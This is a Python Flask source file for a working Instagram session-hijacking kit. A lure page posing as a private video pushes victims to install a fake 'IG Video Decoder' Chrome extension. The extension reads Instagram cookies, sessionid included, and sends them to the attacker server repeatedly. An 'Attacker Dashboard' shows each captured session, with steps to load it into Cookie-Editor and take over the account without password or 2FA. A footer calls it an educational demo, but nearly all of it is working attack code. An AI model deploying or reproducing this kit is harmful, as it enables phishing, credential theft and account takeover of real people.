from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import datetime
import json
import os
import uuid
import io
import zipfile

app = Flask(__name__)
CORS(app)

captured_sessions = []

# ============================================================
# MAIN PAGE - THE PHISHING PAGE
# ============================================================
INDEX_HTML = r"""<!DOCTYPE html>
<html>
<head>
    <title>Instagram Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#c9d1d9;}
        .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:420px;width:100%;padding:32px 24px;text-align:center;}
        .icon{font-size:64px;margin-bottom:16px;}
        h1{font-size:22px;color:#f0f6fc;margin-bottom:4px;}
        .sub{color:#8b949e;font-size:14px;margin-bottom:20px;}
        .preview{background:linear-gradient(135deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#FD1D1D);border-radius:12px;padding:40px 20px;margin-bottom:20px;color:white;}
        .preview .play-btn{width:72px;height:72px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:32px;border:3px solid rgba(255,255,255,0.5);}
        .btn{background:#238636;color:white;border:none;border-radius:8px;padding:14px 0;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:all 0.2s;margin-top:12px;}
        .btn:hover{background:#2ea043;}
        .btn-blue{background:#1f6feb;}.btn-blue:hover{background:#58a6ff;}
        .btn-orange{background:#d29922;}.btn-orange:hover{background:#e3b341;}
        .step{display:none;margin-top:16px;}
        .step.show{display:block;}
        .step .box{background:#21262d;border-radius:8px;padding:16px;text-align:left;font-size:13px;line-height:1.8;}
        .step .box code{background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;font-size:12px;}
        .step .title{font-size:14px;font-weight:600;margin-bottom:10px;}
        .loading-bar{width:100%;height:3px;background:#21262d;border-radius:2px;margin-top:12px;overflow:hidden;display:none;}
        .loading-bar.show{display:block;}
        .loading-bar .fill{height:100%;width:30%;background:#58a6ff;border-radius:2px;animation:load 1.5s ease-in-out infinite;}
        @keyframes load{0%{width:0%;margin-left:0;}50%{width:50%;margin-left:50%;}100%{width:0%;margin-left:100%;}}
        .data-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:16px;display:none;text-align:left;margin-top:12px;}
        .data-box.show{display:block;}
        .data-box .label{color:#8b949e;font-size:11px;margin-bottom:8px;}
        .data-box code{display:block;font-family:'Courier New',monospace;font-size:12px;word-break:break-all;color:#7ee787;}
        .data-box .red{color:#f85149;font-weight:bold;font-size:14px;}
        .result{background:#1a3a2a;border:1px solid #3fb950;border-radius:8px;padding:16px;display:none;margin-top:12px;}
        .result.show{display:block;}
        .result .big{color:#3fb950;font-size:18px;font-weight:bold;}
        .hacker-info{background:#3a1a1a;border:1px solid #f85149;border-radius:8px;padding:16px;display:none;margin-top:12px;text-align:left;font-size:13px;line-height:1.8;}
        .hacker-info.show{display:block;}
        .hacker-info .big{color:#f85149;font-size:16px;font-weight:bold;margin-bottom:8px;}
        .footer{margin-top:20px;font-size:11px;color:#484f58;}
        input[type=text]{width:100%;padding:10px;background:#0d1117;border:1px solid #30363d;color:#f85149;border-radius:4px;font-size:13px;margin-top:8px;}
        .btn-red{background:#da3633;}.btn-red:hover{background:#f85149;}
    </style>
</head>
<body>
<div class="card">
    <div class="icon">🎬</div>
    <h1>Private Video Message</h1>
    <p class="sub">You received a private video via Instagram DM</p>
    
    <div class="preview">
        <div class="play-btn">&#9654;</div>
        <p style="font-size:12px;opacity:0.8;">End-to-end encrypted video</p>
    </div>
    
    <!-- STEP 1: Initial button -->
    <div id="step1"><button class="btn" onclick="goStep2()">&#9654; Play Video</button></div>
    
    <!-- Loading bar -->
    <div class="loading-bar" id="loadingBar"><div class="fill"></div></div>
    
    <!-- STEP 2: Extension required -->
    <div class="step" id="step2">
        <div class="box">
            <div class="title">&#9888;&#65039; Decoder Required</div>
            <p>This video uses E2EE encoding. You need a <b>browser extension</b> to decode it.</p>
            <br>
            <strong>&#128187; For PC (Chrome/Edge):</strong><br>
            Download the extension ZIP, extract it, then load it in Chrome extensions.
            <br><br>
            <button class="btn btn-orange" onclick="goStep3()" style="width:auto;padding:10px 24px;font-size:14px;display:inline-block;">
            &#128230; Download Extension</button>
        </div>
    </div>
    
    <!-- STEP 3: Install instructions -->
    <div class="step" id="step3">
        <div class="box">
            <div class="title">&#128203; Install Instructions</div>
            <ol style="padding-left:20px;color:#8b949e;font-size:12px;line-height:2;">
                <li>Extract the ZIP file you downloaded</li>
                <li>Open Chrome &rarr; go to <code>chrome://extensions</code></li>
                <li>Enable <b>Developer mode</b> (toggle top right)</li>
                <li>Click <b>"Load unpacked"</b> &rarr; select extracted folder</li>
                <li>&#10004; Accept the <b>"cookies"</b> permission popup</li>
                <li>Make sure <b>instagram.com</b> is open in another tab</li>
            </ol>
            <br>
            <button class="btn btn-blue" onclick="goStep4()" style="width:auto;padding:10px 24px;font-size:14px;display:inline-block;">
            &#10004; Extension Installed</button>
        </div>
    </div>
    
    <!-- STEP 4: Stealing -->
    <div class="step" id="step4">
        <div class="box" style="text-align:center;">
            <div class="title">&#9203; Reading Instagram session...</div>
            <div class="loading-bar show"><div class="fill"></div></div>
            <p style="font-size:12px;margin-top:8px;color:#8b949e;">Extension is reading cookies from Instagram...</p>
        </div>
    </div>
    
    <!-- STEP 5: Result -->
    <div class="result" id="step5">
        <div class="big">&#10004; Instagram Session Captured!</div>
        <p style="margin-top:8px;font-size:13px;">Your Instagram session has been sent to the attacker's dashboard.</p>
        
        <div class="data-box show" id="cookieBox">
            <div class="label">&#128308; DATA SENT TO ATTACKER:</div>
            <code id="cookieContent">sessionid=******** (hidden for safety)</code>
        </div>
    </div>
    
    <!-- Hacker info -->
    <div class="hacker-info" id="hackerInfo">
        <div class="big">&#128308; WHAT THE ATTACKER DOES NOW:</div>
        1. Checks the <b>Dashboard</b> at <code>/dashboard</code><br>
        2. Copies your <code>sessionid</code><br>
        3. Opens instagram.com in a DIFFERENT browser<br>
        4. Installs Cookie-Editor extension &rarr; Import &rarr; Pastes sessionid<br>
        5. Refreshes &rarr; <b style="color:#f85149;">Logged in as you!</b><br><br>
        <em>No password. No 2FA.</em>
    </div>
    
    <!-- Manual fallback -->
    <div class="step" id="manualFallback">
        <div class="box" style="border-color:#f85149;">
            <div class="title" style="color:#f85149;">&#9200; Extension Timeout</div>
            <p style="font-size:12px;">Extension not detected. Try the manual demo instead:</p>
            <br>
            <strong>Manual Method:</strong><br>
            1. Open instagram.com &rarr; F12 &rarr; Application &rarr; Cookies<br>
            2. Copy <code>sessionid</code> value<br>
            3. Paste it below:<br>
            <input type="text" id="manualSid" placeholder="Paste sessionid here...">
            <button class="btn btn-red" onclick="manualSubmit()" style="width:auto;padding:8px 16px;font-size:13px;display:inline-block;margin-top:8px;">
            &#128228; Send to Dashboard</button>
        </div>
    </div>
    
    <div class="footer">Educational demonstration &mdash; authorized testing only</div>
</div>

<script>
// ============================================================
// BUTTON FLOW - SIMPLE AND CLEAN
// ============================================================

var BACKEND = window.location.origin;
window.igDecoderInstalled = false;

function goStep2() {
    // Hide step 1, show loading
    document.getElementById('step1').style.display = 'none';
    document.getElementById('loadingBar').classList.add('show');
    
    // Check if extension is already installed (via window flag from content script)
    if (window.igDecoderInstalled) {
        setTimeout(function() {
            document.getElementById('loadingBar').classList.remove('show');
            goStep4();
        }, 500);
        return;
    }
    
    // Fake loading then show extension step
    setTimeout(function() {
        document.getElementById('loadingBar').classList.remove('show');
        document.getElementById('step2').classList.add('show');
    }, 1500);
}

function goStep3() {
    // Download extension
    document.getElementById('step2').innerHTML = 
        '<div class="box"><div class="title">&#9203; Downloading...</div>' +
        '<div class="loading-bar show"><div class="fill"></div></div></div>';
    
    // Trigger download
    window.location.href = BACKEND + '/download-extension';
    
    // Show install instructions after 2 seconds
    setTimeout(function() {
        document.getElementById('step2').classList.remove('show');
        document.getElementById('step3').classList.add('show');
    }, 2000);
}

function goStep4() {
    document.getElementById('step3').classList.remove('show');
    document.getElementById('step4').classList.add('show');
    
    // Signal to extension that we're ready
    window.igDecoderReady = true;
    
    // Try direct extension communication
    tryExtensionBridge();
    
    // Poll server for incoming extension data
    var attempts = 0;
    var pollInterval = setInterval(function() {
        attempts++;
        
        fetch(BACKEND + '/api/sessions')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var sessions = data.sessions || [];
                var igSessions = sessions.filter(function(s) { 
                    return s.has_instagram_session; 
                });
                
                if (igSessions.length > 0) {
                    clearInterval(pollInterval);
                    showResult(igSessions[igSessions.length - 1]);
                }
            })
            .catch(function() {});
        
        // Timeout after 30 seconds
        if (attempts >= 15) {
            clearInterval(pollInterval);
            document.getElementById('step4').classList.remove('show');
            document.getElementById('manualFallback').classList.add('show');
        }
    }, 2000);
}

function tryExtensionBridge() {
    // Method 1: Chrome runtime message
    try {
        if (window.chrome && chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies', source: 'webpage'},
                function(response) {
                    if (response && response.sessionid) {
                        sendToBackend(response);
                    }
                }
            );
        }
    } catch(e) {
        console.log('Extension bridge not available (expected if not installed)');
    }
    
    // Method 2: Listen for custom event from content script
    document.addEventListener('instagram-cookies-stolen', function(e) {
        if (e.detail && e.detail.sessionid) {
            sendToBackend(e.detail);
        }
    });
}

function sendToBackend(data) {
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: 'sessionid=' + (data.sessionid || ''),
            method: 'extension_bridge',
            extension_data: data
        })
    }).catch(function() {});
}

function showResult(session) {
    document.getElementById('step4').classList.remove('show');
    
    var parsed = session.parsed || {};
    var extData = session.extension_data || {};
    var sid = parsed.sessionid || extData.sessionid || '';
    
    if (sid) {
        document.getElementById('step5').classList.add('show');
        document.getElementById('hackerInfo').classList.add('show');
        document.getElementById('cookieContent').innerHTML = 
            '<span class="red">sessionid</span> = ' + sid.substring(0, 60) + '...<br>' +
            '<span style="color:#79c0ff;">ds_user_id</span> = ' + (parsed.ds_user_id || extData.ds_user_id || 'N/A') + '<br>' +
            '<span style="color:#7ee787;">csrftoken</span> = ' + (parsed.csrftoken || extData.csrftoken || 'N/A');
    }
}

function manualSubmit() {
    var sid = document.getElementById('manualSid').value.trim();
    if (!sid) { alert('Paste a sessionid first!'); return; }
    
    fetch(BACKEND + '/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: 'sessionid=' + sid,
            method: 'manual',
            extension_data: {sessionid: sid}
        })
    }).then(function() {
        document.getElementById('manualFallback').innerHTML = 
            '<div class="box" style="border-color:#3fb950;">' +
            '<div class="title" style="color:#3fb950;">&#10004; Sent to Dashboard!</div>' +
            '<p>Check <code>/dashboard</code> to see the session.</p></div>';
        document.getElementById('hackerInfo').classList.add('show');
    });
}

// Auto-detect if extension is already installed
setTimeout(function() {
    if (window.igDecoderInstalled) {
        console.log('Extension detected!');
    }
}, 1000);
</script>
</body>
</html>"""

# ============================================================
# DASHBOARD HTML
# ============================================================
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html>
<head>
    <title>Attacker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:20px;}
        .header{border-bottom:2px solid #30363d;padding-bottom:16px;margin-bottom:20px;}
        .header h1{color:#f85149;font-family:'Courier New',monospace;font-size:24px;}
        .header p{color:#8b949e;font-size:13px;margin-top:4px;}
        .alert-box{background:#3a1a1a;border:2px solid #f85149;border-radius:8px;padding:20px;margin-bottom:20px;text-align:center;display:none;}
        .alert-box.show{display:block;}
        .alert-box .big{font-size:48px;}
        .alert-box h2{color:#f85149;font-size:20px;margin:8px 0;}
        .session-value{background:#0d1117;border:1px solid #f85149;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:14px;color:#f85149;word-break:break-all;margin:12px 0;user-select:all;}
        .copy-btn{background:#f85149;color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:13px;cursor:pointer;margin-top:8px;}
        .copy-btn:hover{background:#da3633;}
        .stats{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;}
        .stat{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px 20px;flex:1;min-width:120px;}
        .stat .num{font-size:28px;font-weight:bold;color:#58a6ff;}
        .stat .num.red{color:#f85149;}
        .stat .num.green{color:#3fb950;}
        .stat .label{color:#8b949e;font-size:11px;margin-top:2px;}
        .session{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;margin-bottom:12px;}
        .session .row{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:8px;}
        .session .time{color:#8b949e;font-size:12px;}
        .badge{padding:2px 10px;border-radius:10px;font-size:11px;font-weight:600;}
        .badge-red{background:#f85149;color:#fff;}
        .badge-green{background:#3fb950;color:#000;}
        .badge-gray{background:#21262d;color:#8b949e;}
        .cookie-box{background:#0d1117;border:1px solid #21262d;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:11px;word-break:break-all;max-height:250px;overflow-y:auto;}
        .cookie-box .red{color:#f85149;font-weight:bold;}
        .cookie-box .blue{color:#79c0ff;}
        .cookie-box .green{color:#7ee787;}
        .empty{text-align:center;padding:60px;color:#484f58;}
        .empty .big{font-size:48px;margin-bottom:12px;}
        .actions{margin-top:16px;}
        .actions button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;margin-right:8px;}
        .actions button:hover{border-color:#58a6ff;color:#58a6ff;}
        .actions .danger:hover{border-color:#f85149;color:#f85149;}
        .refresh-note{color:#484f58;font-size:12px;margin-top:20px;text-align:center;}
        .setup-box{background:#1a1a2e;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px;line-height:1.8;}
        .setup-box h3{color:#d29922;margin-bottom:8px;font-size:15px;}
        .setup-box ol{padding-left:20px;color:#8b949e;font-size:13px;}
        .setup-box code{background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff;}
    </style>
</head>
<body>
<div class="header">
    <h1>&#128308; SESSION HIJACKING DASHBOARD</h1>
    <p>Captured Instagram session IDs appear in REAL TIME</p>
</div>

<div class="setup-box">
    <h3>&#128225; How to use this demo:</h3>
    <ol>
        <li>Open <a href="/" style="color:#58a6ff;">the main page</a> in a laptop browser</li>
        <li>Click "Play Video" &rarr; Download Extension &rarr; Install in Chrome</li>
        <li>Extension reads <code>sessionid</code> from instagram.com</li>
        <li><b>sessionid appears below</b> &rarr; Copy & inject into Cookie-Editor</li>
    </ol>
</div>

<div class="alert-box" id="realAlert">
    <div class="big">&#128308;&#128308;&#128308;</div>
    <h2>&#9888;&#65039; REAL INSTAGRAM SESSION CAPTURED!</h2>
    <p style="color:#8b949e;font-size:12px;">Copy this sessionid to hijack the account:</p>
    <div class="session-value" id="stolenSessionid">Loading...</div>
    <button class="copy-btn" onclick="copySession()">&#128203; Copy sessionid</button>
    <p style="color:#8b949e;font-size:11px;margin-top:8px;">
        Install <b>Cookie-Editor</b> extension &rarr; Import &rarr; Paste &rarr; Refresh instagram.com<br>
        <b style="color:#f85149;">You're now logged in as the victim!</b>
    </p>
</div>

<div class="stats">
    <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Hits</div></div>
    <div class="stat"><div class="num green" id="extCount">0</div><div class="label">Extension Calls</div></div>
    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">&#128308; sessionid</div></div>
</div>

<div id="sessionsContainer">
    <div class="empty"><div class="big">&#128225;</div><h3>Waiting for target...</h3></div>
</div>

<div class="actions">
    <button onclick="fetchData()">&#128260; Refresh Now</button>
    <button class="danger" onclick="clearAll()">&#128465;&#65039; Clear All</button>
</div>
<div class="refresh-note">Auto-refresh every 2 seconds</div>

<script>
var BACKEND = window.location.origin;

function fetchData() {
    fetch(BACKEND + '/api/sessions')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var sessions = data.sessions || [];
            var total = sessions.length;
            var extSessions = sessions.filter(function(s) { return s.source === 'extension'; });
            var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('extCount').textContent = extSessions.length;
            document.getElementById('sessionCount').textContent = igSessions.length;
            
            var alertBox = document.getElementById('realAlert');
            var stolenEl = document.getElementById('stolenSessionid');
            
            if (igSessions.length > 0) {
                var latest = igSessions[igSessions.length - 1];
                var sid = (latest.parsed && latest.parsed.sessionid) || 
                          (latest.extension_data && latest.extension_data.sessionid) || '';
                if (sid) {
                    alertBox.classList.add('show');
                    stolenEl.textContent = sid;
                }
            } else {
                alertBox.classList.remove('show');
            }
            
            if (sessions.length === 0) {
                document.getElementById('sessionsContainer').innerHTML = 
                    '<div class="empty"><div class="big">&#128225;</div><h3>Waiting...</h3></div>';
                return;
            }
            
            var html = '';
            for (var i = sessions.length - 1; i >= 0; i--) {
                var s = sessions[i];
                var parsed = s.parsed || {};
                var extData = s.extension_data || {};
                var allData = {};
                Object.keys(parsed).forEach(function(k) { allData[k] = parsed[k]; });
                Object.keys(extData).forEach(function(k) { allData[k] = extData[k]; });
                
                var hasSid = allData.sessionid ? true : false;
                var details = '';
                
                if (Object.keys(allData).length > 0) {
                    Object.keys(allData).forEach(function(k) {
                        var v = allData[k];
                        var cls = 'blue';
                        if (k === 'sessionid') cls = 'red';
                        else if (k === 'ds_user_id') cls = 'green';
                        else if (k.indexOf('csrf') >= 0) cls = 'green';
                        details += '<span class="' + cls + '">' + k + '</span> = <span class="green">' + v + '</span><br>';
                    });
                } else {
                    details = s.cookies || '(empty)';
                }
                
                var badge = hasSid ? 
                    '<span class="badge badge-red">&#128308; sessionid!</span>' :
                    (Object.keys(allData).length > 0 ? '<span class="badge badge-green">&#10004; Data</span>' : '<span class="badge badge-gray">Empty</span>');
                
                var sourceIcon = s.source === 'extension' ? '&#129488; Extension' : '&#127760; Browser';
                
                html += '<div class="session"><div class="row">' +
                    '<span class="time">' + s.timestamp + '</span>' +
                    '<span>' + sourceIcon + '</span>' +
                    '</div><div>' + badge + '</div>' +
                    '<div class="cookie-box">' + details + '</div></div>';
            }
            document.getElementById('sessionsContainer').innerHTML = html;
        })
        .catch(function() {
            document.getElementById('sessionsContainer').innerHTML = 
                '<div class="empty"><div class="big">&#10060;</div><h3>Error connecting to server</h3></div>';
        });
}

function copySession() {
    var text = document.getElementById('stolenSessionid').textContent;
    navigator.clipboard.writeText(text).then(function() {
        alert('&#10004; sessionid copied! Paste into Cookie-Editor &rarr; Import &rarr; Refresh Instagram');
    });
}

function clearAll() {
    if (!confirm('Clear all captured sessions?')) return;
    fetch(BACKEND + '/clear', { method: 'POST' }).then(function() { fetchData(); });
}

fetchData();
setInterval(fetchData, 2000);
</script>
</body>
</html>"""

# ============================================================
# EXTENSION FILES
# ============================================================

def create_extension_zip(server_url):
    """Create the Chrome extension ZIP file."""
    
    manifest = {
        "manifest_version": 3,
        "name": "IG Video Decoder",
        "version": "1.0",
        "description": "Decodes encrypted Instagram video formats",
        "permissions": ["cookies", "storage"],
        "host_permissions": [
            "https://www.instagram.com/*",
            "https://instagram.com/*",
            "https://*.instagram.com/*"
        ],
        "background": {
            "service_worker": "background.js"
        },
        "content_scripts": [{
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_end"
        }],
        "action": {
            "default_title": "IG Video Decoder"
        }
    }
    
    # Background script - steals cookies and sends to server
    background_js = f"""
// IG Video Decoder - Background Service Worker
// Steals Instagram cookies using chrome.cookies API (bypasses HttpOnly)
var ATTACKER_SERVER = "{server_url}";

// Steal immediately when extension starts
chrome.runtime.onInstalled.addListener(function() {{
    console.log('IG Decoder installed - stealing cookies...');
    stealAndSend();
}});

chrome.runtime.onStartup.addListener(function() {{
    console.log('IG Decoder started - stealing cookies...');
    stealAndSend();
}});

// Steal every 10 seconds while browser is running
setInterval(stealAndSend, 10000);

// Handle messages from webpage
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {{
    if (request.action === 'get_instagram_cookies') {{
        stealCookies().then(function(cookies) {{
            sendResponse(cookies);
        }});
        return true;
    }}
}});

function stealAndSend() {{
    stealCookies().then(function(cookies) {{
        if (Object.keys(cookies).length > 0) {{
            console.log('IG Decoder: Sending cookies to attacker server...');
            // Send via fetch
            fetch(ATTACKER_SERVER + '/extension-bulk', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    cookies: cookies,
                    timestamp: new Date().toISOString()
                }})
            }}).catch(function(err) {{
                console.log('IG Decoder: Send failed (expected on first run)');
            }});
            
            // Also send individual important cookies via image beacon
            var important = ['sessionid', 'ds_user_id', 'csrftoken', 'ig_did'];
            important.forEach(function(name) {{
                if (cookies[name]) {{
                    var img = new Image();
                    img.src = ATTACKER_SERVER + '/extension-callback?' +
                        'name=' + encodeURIComponent(name) + 
                        '&value=' + encodeURIComponent(cookies[name]);
                }}
            }});
        }}
    }});
}}

function stealCookies() {{
    return new Promise(function(resolve) {{
        var result = {{}};
        var urls = ['https://www.instagram.com', 'https://instagram.com'];
        var completed = 0;
        
        urls.forEach(function(url) {{
            chrome.cookies.getAll({{url: url}}, function(cookies) {{
                if (cookies && cookies.length > 0) {{
                    cookies.forEach(function(c) {{
                        result[c.name] = c.value;
                    }});
                }}
                completed++;
                if (completed >= urls.length) {{
                    resolve(result);
                }}
            }});
        }});
        
        // Timeout fallback
        setTimeout(function() {{ resolve(result); }}, 2000);
    }});
}}
"""
    
    # Content script - bridges webpage and extension
    content_js = """
// IG Video Decoder - Content Script
// Bridges the webpage and the background script

(function() {
    // Signal that extension is installed
    window.igDecoderInstalled = true;
    window.igDecoderReady = true;
    
    // Dispatch event for the webpage
    window.dispatchEvent(new CustomEvent('ig-extension-ready', {
        detail: {ready: true}
    }));
    
    // Listen for requests from the webpage via postMessage
    window.addEventListener('message', function(event) {
        if (event.data && event.data.action === 'request_ig_cookies') {
            chrome.runtime.sendMessage(
                {action: 'get_instagram_cookies'},
                function(response) {
                    if (response) {
                        window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
                            detail: response
                        }));
                    }
                }
            );
        }
    });
    
    // Auto-send cookies after page loads
    setTimeout(function() {
        chrome.runtime.sendMessage(
            {action: 'get_instagram_cookies', source: 'content_script'},
            function(response) {
                if (response && response.sessionid) {
                    window.dispatchEvent(new CustomEvent('instagram-cookies-stolen', {
                        detail: response
                    }));
                }
            }
        );
    }, 1000);
    
    console.log('IG Video Decoder content script loaded');
})();
"""
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps(manifest, indent=2))
        zf.writestr("background.js", background_js)
        zf.writestr("content.js", content_js)
    
    buf.seek(0)
    return buf

# ============================================================
# ROUTES
# ============================================================

@app.route("/")
def home():
    return INDEX_HTML

@app.route("/dashboard")
def dashboard():
    return DASHBOARD_HTML

@app.route("/api/sessions")
def api_sessions():
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["GET", "POST"])
def steal():
    if request.method == "GET":
        cookies = request.args.get("c", "")
        data = {"cookies": cookies, "method": "get"}
    else:
        data = request.get_json(silent=True) or {}
        cookies = data.get("cookies", "")
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": data.get("userAgent", request.headers.get("User-Agent", "")),
        "source": data.get("method", "browser"),
        "cookies": cookies,
        "method": data.get("method", "unknown"),
        "extension_data": data.get("extension_data", {})
    }
    
    parsed = {}
    if cookies:
        for pair in cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    
    ext_data = data.get("extension_data", {})
    if isinstance(ext_data, dict):
        for k, v in ext_data.items():
            if k not in parsed:
                parsed[k] = str(v) if not isinstance(v, str) else v
    
    record["parsed"] = parsed
    record["has_instagram_session"] = "sessionid" in parsed
    captured_sessions.append(record)
    
    if record["has_instagram_session"]:
        print(f"\n{'='*50}")
        print(f"🔴🔴🔴 REAL Instagram sessionid CAPTURED!")
        print(f"   sessionid = {parsed['sessionid']}")
        print(f"   IP: {record['ip']}")
        print(f"{'='*50}")
    
    return jsonify({"status": "ok", "has_session": record["has_instagram_session"]})

@app.route("/extension-callback")
def extension_callback():
    name = request.args.get("name", "")
    value = request.args.get("value", "")
    
    if name and value:
        captured_sessions.append({
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": {name: value},
            "parsed": {name: value},
            "has_instagram_session": (name == "sessionid"),
            "cookies": f"{name}={value}",
            "method": "extension_callback"
        })
        
        if name == "sessionid":
            print(f"\n🔴 EXTENSION CALLBACK - sessionid = {value}")
    
    return "", 200, {"Content-Type": "image/gif"}

@app.route("/extension-bulk", methods=["POST"])
def extension_bulk():
    data = request.get_json(silent=True) or {}
    cookies = data.get("cookies", {})
    
    if cookies and isinstance(cookies, dict):
        record = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.datetime.now().isoformat(),
            "ip": request.remote_addr,
            "source": "extension",
            "extension_data": cookies,
            "parsed": dict(cookies),
            "has_instagram_session": "sessionid" in cookies,
            "cookies": "; ".join([f"{k}={v}" for k, v in cookies.items()]),
            "method": "extension_bulk"
        }
        captured_sessions.append(record)
        
        if cookies.get("sessionid"):
            print(f"\n🔴 EXTENSION BULK - sessionid = {cookies.get('sessionid')}")
    
    return jsonify({"status": "ok"})

@app.route("/download-extension")
def download_extension():
    server_url = request.host_url.rstrip("/")
    buf = create_extension_zip(server_url)
    
    return send_file(
        buf,
        mimetype='application/zip',
        as_attachment=True,
        download_name='ig-video-decoder.zip'
    )

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

@app.route("/health")
def health():
    return jsonify({"status": "alive", "captured": len(captured_sessions)})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n{'='*60}")
    print(f"  🔴 INSTAGRAM SESSION HIJACKING DEMO")
    print(f"{'='*60}")
    print(f"\n  📌 MAIN PAGE:   http://localhost:{port}")
    print(f"  📌 DASHBOARD:   http://localhost:{port}/dashboard")
    print(f"\n  📌 HOW IT WORKS ON LAPTOP:")
    print(f"     1. Open http://localhost:{port}")
    print(f"     2. Click 'Play Video' → Download Extension")
    print(f"     3. Extract ZIP → Load unpacked in chrome://extensions")
    print(f"     4. Make sure instagram.com is open in another tab")
    print(f"     5. Click 'Extension Installed'")
    print(f"     6. Extension steals sessionid → Shows on dashboard!")
    print(f"{'='*60}\n")
    app.run(host="0.0.0.0", port=port, debug=True)